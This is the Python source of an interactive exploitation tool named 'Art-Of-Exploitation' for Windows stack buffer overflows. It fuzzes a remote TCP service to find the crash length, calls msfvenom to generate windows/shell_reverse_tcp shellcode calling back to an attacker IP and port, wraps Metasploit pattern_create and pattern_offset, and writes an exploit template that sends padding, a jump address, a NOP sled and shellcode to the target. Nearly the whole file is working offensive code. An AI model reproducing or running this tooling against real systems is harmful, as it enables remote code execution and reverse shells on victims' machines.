
import subprocess
import sys
import random
import time
import socket
import http.server
import socketserver


r = "\033[1;31m"
g = "\033[1;32m"
y = "\033[1;33m"
b = "\033[1;34m"
d = "\033[2;37m"
R = "\033[1;41m"
Y = "\033[1;43m"
B = "\033[1;44m"
w = "\033[0m"

def isIp(ip):

	classlist = ip.split(".")
	if len(classlist)==4:
		for class_ in classlist:
			if int(class_):
				if int(class_)>255 or int(class_)<1:
					return False
					break
		return True


def fuzz():

	print(f"	you are using {y}fuzzing{g}(Art-Of-Exploitation){w}\n\n")
	ip = input(f"{b}Target IP (RHOST *)>{w} ")
	if not isIp(ip):
		print(f"{r}[-]{w} Invalid Host!")
		return 0
	port = input(f"{b}Target Port (RPORT *)>{w} ")

	if int(port):
		if int(port) > 65535:
			print(f"{r}[-]{w} port can not be bigger than 65535 !")
			return 0

		elif int(port) < 1:
			print(f"{r}[-]{w} port can not be smaller than 1 !")
			return 0

	TargetInput = input(f"{b}Target Input ()>{w} ")
	string = TargetInput + " " + 'A'*50

	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.settimeout(7)
			connect = s.connect((ip, int(port)))
			s.recv(1024)
			print(f"Fuzzing with {b}{str(len(string) - len(TargetInput))}{w} bytes")
			s.send(bytes(string,"latin-1"))

		except Exception as e:
			print(f"Fuzzing crashed at {str(len(string) - len(TargetInput))} bytes")
			print(f"OverFlow size {g}{str(len(string) - len(TargetInput))}{w}")
			print(e)
			return 0

		string += 100 * "A"
		time.sleep(1)


def GenExploit():

	print(f"	you are using {y}genarate{g}(Art-Of-Exploitation){w}\n\n")
	formats = ["base32","base64","bash","c","csharp","dw","dword","hex","java","js_be","js_le","num","perl","pl","powershell","ps1","py","python","raw","rb","ruby","sh","vbapplication","vbscript","asp","aspx","aspx-exe","axis2","dll","elf","elf-so","exe","exe-only","exe-service","exe-small","hta-psh","jar","jsp","loop-vbs","macho","msi","msi-nouac","osx-app","psh","psh-cmd","psh-net","psh-reflection","python-reflection","vba","vba-exe","vba-psh","vbs","war"]
	ip = input(f"{b}Attacker IP (LHOST *)>{w} ")

	if not isIp(ip):
		print(f"{r}[-]{w} Invalid Host!")
		return 0

	port = input(f"{b}Listening port (LPORT *)>{w} ")

	if int(port):
		if int(port) > 65535:
			print(f"{r}[-]{w} port can not be bigger than 65535 !")
			return 0

		elif int(port) < 1:
			print(f"{r}[-]{w} port can not be smaller than 1 !")
			return 0

	variable = input(f"{b}variable name(bydefault={r}random_str{b})>{w} ")
	if len(variable)<1:
		variable = str(random.randint(100, 1000))

	format_ = input(f"{b}shellcode format(bydefault=python)>{w} ")
	if len(format_)>0 :
		if format_ in formats:
			format_ = format_
		else:
			print("\r\n" + f"{r}[-]{w}unknowne format")
			print("Framework Executable Formats")
			print("============================")
			for f in formats:
				print(f, end = "	")
			print("\r\n")
			return 0
	else:
		format_ = "python"

	moreOptions = input(f"{b}more options(bydefault={r}NULL{b})>{w} ")
	print("\n")

	cmd = f"msfvenom -p windows/shell_reverse_tcp LHOST={ip} LPORT={port} -f {format_} -v var_{variable} {moreOptions}"
	print("Genarating shell code ...\r\n\n")
	res = subprocess.check_output(cmd, shell=True).decode()
	with open(f'result/shellcode_{variable}.txt', 'w') as file:
		file.write(res)
	print(f"{g}[+]{b} the output path result/shellcode_{variable}.txt{w}")


def badchars():

	for i in range(0,256):
		print('\\x%02X' % i, end='')
	print("\n")


def creatPattern():
	print(f"	you are using {y}pattern create{g}(Art-Of-Exploitation){w}\n\n")
	length = input(f"{b}overflow length >{w} ")
	cmd = f"msf-pattern_create -l {length}"
	print(subprocess.check_output(cmd, shell=True).decode())


def offsetPattern():
	print(f"	you are using {y}pattern offset{g}(Art-Of-Exploitation){w}\n\n")
	query = input(f"{b}offset address value >{w} ")
	cmd = f"msf-pattern_offset -q {query}"
	print(subprocess.check_output(cmd, shell=True).decode())


def explode():

	print(f"	you are using {y}explode{g}(Art-Of-Exploitation){w}\n\n")
	shellcode = input(f"{b}shellcode (*)>{w} ")
	
	if len(shellcode) < 50:
		print(f"{r}[-]{w} can not explode payload smaller than 50!")
		return 0

	variable = input(f"{b}variable name (bydefault=str)>{w} ")
	if len(variable)>0:
		print("set variable ==> "+variable)
	else:
		variable = "str"
		print("set variable ==> str")

	length = input(f"{b}variable length (bydefault=20)>{w} ")
	if len(length)>0 and int(length)>10:
		print("set length ==> "+ length)
	else:
		length = 30
		print("set length ==> 30")

	shell = ""
	for i in range(0,len(shellcode),int(length)):
		part = variable + "=" + variable + '+"' + shellcode[i:i+int(length)] + '"\n'
		shell+=part

	with open(f'result/{variable}.txt', 'w') as file:
		file.write(shell)
	print(f"{g}[+]{w} exploding ...")
	time.sleep(3)
	print(f"\n{g}[+]{b} the output path result/{variable}.txt{w}")

def exploit():
	print(f"	you are using {y}exploit{g}(Art-Of-Exploitation){w}\n\n")
	ip = input(f"{b}Attacker IP (LHOST *)>{w} ")

	if not isIp(ip):
		print(f"{r}[-]{w} Invalid Host!")
		return 0

	port = input(f"{b}Listening port (LPORT *)>{w} ")

	if int(port):
		if int(port) > 65535:
			print(f"{r}[-]{w} port can not be bigger than 65535 !")
			return 0

		elif int(port) < 1:
			print(f"{r}[-]{w} port can not be smaller than 1 !")
			return 0

	exploit = f"""
	import os
	import sys
	import socket
	import struct


	host = "{ip}"
	port = {port}
	offset = 0 #just test with 0
	padding = 'A'*offset
	jmpAddr = '' # exemple: 0x77BDB94B just normal adderss not little indian

	shellcode = (#your shellcode here)

	jmp = struct.pack("I", jmpAddr)

	buffer = padding + jmp + "\\x90"*16 + shellcode + "\\x90"*16
	try:
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		connection = s.connect((host, port))
		s.send(buffer)
		s.close()

	except:
		print "\\n[-]Can not connect!"
		\n
	"""
	print(f"[+] Genarating Exploit for {ip}...")
	time.sleep(2)
	num = random.randint(1, 10000)
	with open(f'result/exploit{num}.py', 'w') as file:
		file.write(exploit)
	print(f"{b}[+] {g}here you go..")
	print(f"{b}[+] {w}your exploit here {y}result/exploit{num}.py{w}")


def server():

	PORT = 8000

	Handler = http.server.SimpleHTTPRequestHandler
	
	with socketserver.TCPServer(("", PORT), Handler) as httpd:
		print("Type ctrl+c for stop the server")
		print("serving at port", PORT)
		while True:
			httpd.handle_request()




options = f"	{g}options  :{w} show this help message\n"
options+= f"	{g}genarate :{w} this option allow you to use msfvenom tool for Genarating shellcode\n"
options+= f"	{g}explode	 :{w} in case you wanna explode your shellcode to many variables\n"
options+= f"	{g}exploit	 :{w} create a pre exploit for make it easy on you\n"
options+= f"	{g}fuzz 	 :{w} fuzz the program for spicify the overflow size(just for Simple Windows Exploitation)\n"
options+= f"	{g}badchars :{w} print all characters from \\x00 to \\xff \n"
options+= f"	{g}pcreate  :{w} pattern create\n"
options+= f"	{g}poffset  :{w} pattern offset\n"
options+= f"	{g}server   :{w} make a server for file transfer\n"

banner = f"""{g}
 _____________________________________________________________________
|                                                                     |
|               Art - Of - Exploitation                               |
|_____________________________________________________________________|
|                                                                     |
|        Authors                                                      |
|_____________________________________________________________________| 
|                                                                     |
|        Hamza    :          [   @m3z0diac   ]                        |
|        Karim    :          [   @mchklt     ]                        |
|_____________________________________________________________________|
|                                                                     |
|               https://www.hkgang.com                                |
|_____________________________________________________________________|
{w}""" 
print(banner)
print(f"Type {g}help{w} or {g}options{w} for options\n")

while True:

	usercmd = input(f"{r}m3z0diac {g}(Art-Of-Exploitation)>{w} ")

	if usercmd=="help" or usercmd=="options":
		print(options)

	elif usercmd=="genarate":
		GenExploit()
	elif usercmd=="explode":
		explode()
	elif usercmd=="exploit":
		exploit()
	elif usercmd=="fuzz":
		fuzz()
	elif usercmd=="badchars":
		badchars()
	elif usercmd=="pcreate":
		creatPattern()
	elif usercmd=="poffset":
		offsetPattern()
	elif usercmd=="server":
		try:
			server()
		except:
			print(f"alreay server 127.0.0.1 8000")
	elif usercmd=="clear":
		subprocess.call(usercmd, shell=True)
	elif usercmd=="exit":
		sys.exit()
	else:
		print(f"{r}[-]{w} unknowne command !")